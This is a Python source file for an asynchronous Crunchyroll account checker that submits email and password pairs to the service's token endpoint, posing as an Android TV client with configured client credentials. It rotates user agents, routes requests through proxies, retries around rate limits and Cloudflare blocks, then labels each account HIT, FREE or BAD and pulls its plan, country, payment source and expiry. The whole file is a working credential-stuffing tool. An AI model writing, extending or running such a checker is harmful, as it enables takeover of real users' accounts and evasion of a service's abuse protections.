import re
import uuid
import random
import asyncio
import logging
from typing import Any, Optional

import aiohttp

import config

log = logging.getLogger(__name__)

# Shared session pool – created once and reused
_shared_session: Optional[aiohttp.ClientSession] = None


def _pick_ua(token_flow: bool = True) -> str:
    """Pick a User-Agent. token_flow=True → Android TV UA, False → browser UA."""
    if token_flow:
        return config.USER_AGENTS[0]
    return random.choice(config.USER_AGENTS[3:])


def _token_headers(device_id: str, anonymous_id: str, ua: str) -> dict[str, str]:
    return {
        "User-Agent": ua,
        "Accept": "application/json",
        "Accept-Charset": "UTF-8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "ETP-Anonymous-ID": anonymous_id,
        "Request-Type": "SignIn",
    }


def _auth_headers(access_token: str, ua: str) -> dict[str, str]:
    return {
        "Authorization": f"Bearer {access_token}",
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    }


def _proxy_connector(proxy_url: str) -> aiohttp.TCPConnector:
    """Create a connector that routes through the given proxy."""
    from aiohttp_socks import ProxyConnector

    if proxy_url.startswith("socks5://") or proxy_url.startswith("socks4://"):
        return ProxyConnector.from_url(proxy_url, limit=5)
    # HTTP/HTTPS proxy
    from aiohttp import TCPConnector
    return TCPConnector(limit=5)


def _get_proxy_dict(proxy_url: str) -> dict[str, str]:
    """Return aiohttp proxy kwarg dict."""
    return {"proxy": proxy_url}


async def get_shared_session() -> aiohttp.ClientSession:
    """Return (or create) the shared aiohttp session."""
    global _shared_session
    if _shared_session is None or _shared_session.closed:
        connector = aiohttp.TCPConnector(
            limit=200,
            limit_per_host=30,
            ttl_dns_cache=300,
            use_dns_cache=True,
            force_close=False,
            enable_cleanup_closed=True,
        )
        timeout = aiohttp.ClientTimeout(total=config.REQUEST_TIMEOUT + 5)
        _shared_session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"Accept-Encoding": "gzip, deflate, br"},
        )
    return _shared_session


async def close_shared_session() -> None:
    global _shared_session
    if _shared_session and not _shared_session.closed:
        await _shared_session.close()
        _shared_session = None


async def crunchy_check(
    email: str,
    password: str,
    proxy_url: Optional[str] = None,
    semaphore: Optional[asyncio.Semaphore] = None,
) -> tuple[str, str, dict[str, Any]]:
    """
    Async Crunchyroll account checker.

    Returns:
        (status, detail, info)
        status: "HIT" | "FREE" | "BAD" | "RATE" | "RETRY"
        info: dict with user, plan, expires, etc.
    """
    for attempt in range(config.MAX_RETRIES):
        if semaphore:
            async with semaphore:
                return await _do_check(email, password, proxy_url, attempt)
        else:
            return await _do_check(email, password, proxy_url, attempt)
    return ("RETRY", "Max retries", {})


async def _do_check(
    email: str,
    password: str,
    proxy_url: Optional[str],
    attempt: int,
) -> tuple[str, str, dict[str, Any]]:
    sess = await get_shared_session()
    device_id = str(uuid.uuid4())
    anonymous_id = str(uuid.uuid4())
    ua_token = _pick_ua(token_flow=True)
    ua_auth = _pick_ua(token_flow=False)
    proxy_kw = _get_proxy_dict(proxy_url) if proxy_url else {}

    try:
        # ── Step 1: Auth token ──────────────────────────────
        token_data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "client_id": config.BRN_CID,
            "client_secret": config.BRN_SEC,
            "device_type": "Google SDK built for x86",
            "device_id": device_id,
            "device_name": "sdk_google_atv_x86",
        }
        headers = _token_headers(device_id, anonymous_id, ua_token)

        try:
            async with sess.post(
                f"{config.BRN_API}/auth/v1/token",
                data=token_data,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=config.REQUEST_TIMEOUT),
                **proxy_kw,
            ) as r:
                status_code = r.status
                body = await r.text()
        except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
            if attempt < config.MAX_RETRIES - 1:
                await asyncio.sleep(random.uniform(1.5, 4))
                return await _do_check(email, password, proxy_url, attempt + 1)
            return ("RETRY", f"Network: {type(exc).__name__}", {})

        # Rate limited
        if status_code == 429:
            if attempt < config.MAX_RETRIES - 1:
                delay = min(2 ** attempt * random.uniform(1, 3), 15)
                await asyncio.sleep(delay)
                return await _do_check(email, password, proxy_url, attempt + 1)
            return ("RATE", "Rate limited", {})

        # Bad credentials
        if status_code in (400, 401) or "invalid_grant" in body or "invalid_credentials" in body:
            return ("BAD", "", {})

        # Cloudflare / server error
        if status_code == 403:
            if attempt < config.MAX_RETRIES - 1:
                await asyncio.sleep(random.uniform(2, 5))
                return await _do_check(email, password, proxy_url, attempt + 1)
            return ("RETRY", "CF block (403)", {})

        if status_code >= 500:
            if attempt < config.MAX_RETRIES - 1:
                await asyncio.sleep(random.uniform(2, 5))
                return await _do_check(email, password, proxy_url, attempt + 1)
            return ("RETRY", f"Server {status_code}", {})

        # Parse token
        try:
            token_json = await _safe_json(body)
        except Exception:
            return ("RETRY", "JSON parse error", {})

        access_token = token_json.get("access_token")
        if not access_token:
            return ("RETRY", "No access token", {})

        auth_h = _auth_headers(access_token, ua_auth)
        info: dict[str, str] = {
            "user": "",
            "verified": "No",
            "plan": "",
            "sku": "",
            "streams": "",
            "expires": "",
            "renew": "",
            "country": "",
            "payment": "",
        }

        # ── Step 2: Account info ────────────────────────────
        try:
            async with sess.get(
                f"{config.BRN_API}/accounts/v1/me",
                headers=auth_h,
                timeout=aiohttp.ClientTimeout(total=config.REQUEST_TIMEOUT),
                **proxy_kw,
            ) as r2:
                if r2.status != 200:
                    return ("RETRY", f"Account fetch {r2.status}", {})
                account_data = await r2.json()
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return ("RETRY", "Account fetch error", {})

        external_id = account_data.get("external_id", "")
        email_verified = account_data.get("email_verified", False)
        username = account_data.get("username", "")

        # Try multiprofile for username
        if not username:
            try:
                async with sess.get(
                    f"{config.BRN_API}/accounts/v1/me/multiprofile",
                    headers=auth_h,
                    timeout=aiohttp.ClientTimeout(total=config.REQUEST_TIMEOUT),
                    **proxy_kw,
                ) as r3:
                    text = await r3.text()
                    m = re.search(r'"username"\s*:\s*"([^"]+)"', text)
                    if m:
                        username = m.group(1)
            except Exception:
                pass
        if not username:
            username = email.split("@")[0]

        info["user"] = username
        info["verified"] = "Yes" if email_verified else "No"

        if not external_id:
            return ("FREE", "", info)

        # ── Step 3: Subscription benefits ────────────────────
        try:
            async with sess.get(
                f"{config.BRN_API}/subs/v1/subscriptions/{external_id}/benefits",
                headers=auth_h,
                timeout=aiohttp.ClientTimeout(total=config.REQUEST_TIMEOUT),
                **proxy_kw,
            ) as r4:
                benefits_text = await r4.text()
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return ("RETRY", "Benefits fetch error", {})

        if ("subscription.not_found" in benefits_text
                or '"total":0' in benefits_text
                or '"subscription_country":""' in benefits_text):
            return ("FREE", "", info)

        # Extract plan
        sm = re.search(r'"concurrent_streams\.(\d+)"', benefits_text)
        if sm:
            streams = sm.group(1)
            info["streams"] = streams
            info["plan"] = config.PLAN_MAP.get(streams, f"PLAN_{streams}")

        # Extract country
        cm = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', benefits_text)
        if cm:
            cc = cm.group(1)
            info["country"] = config.COUNTRY_MAP.get(cc, cc)

        # Extract payment
        pm = re.search(r'"source"\s*:\s*"([^"]+)"', benefits_text)
        if pm:
            info["payment"] = pm.group(1)

        # ── Step 4: Subscription details (expiry/renewal) ───
        account_id = account_data.get("account_id", "")
        if account_id:
            try:
                async with sess.get(
                    f"{config.BRN_API}/subs/v3/subscriptions/{account_id}",
                    headers=auth_h,
                    timeout=aiohttp.ClientTimeout(total=config.REQUEST_TIMEOUT),
                    **proxy_kw,
                ) as r5:
                    sub_text = await r5.text()

                em = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', sub_text)
                if em:
                    info["expires"] = em.group(1)

                rm = re.search(r'"auto_renew"\s*:\s*(true|false)', sub_text)
                if rm:
                    info["renew"] = "Yes" if rm.group(1) == "true" else "No"

                sk = re.search(r'"sku"\s*:\s*"([^"]+)"', sub_text)
                if sk:
                    info["sku"] = sk.group(1)

            except Exception:
                pass

        if info["plan"]:
            return ("HIT", "", info)
        return ("FREE", "", info)

    except asyncio.CancelledError:
        raise
    except Exception as exc:
        if attempt < config.MAX_RETRIES - 1:
            await asyncio.sleep(random.uniform(1.5, 4))
            return await _do_check(email, password, proxy_url, attempt + 1)
        return ("RETRY", str(exc)[:80], {})


async def _safe_json(text: str) -> dict:
    """Parse JSON, raising on failure."""
    import json
    return json.loads(text)
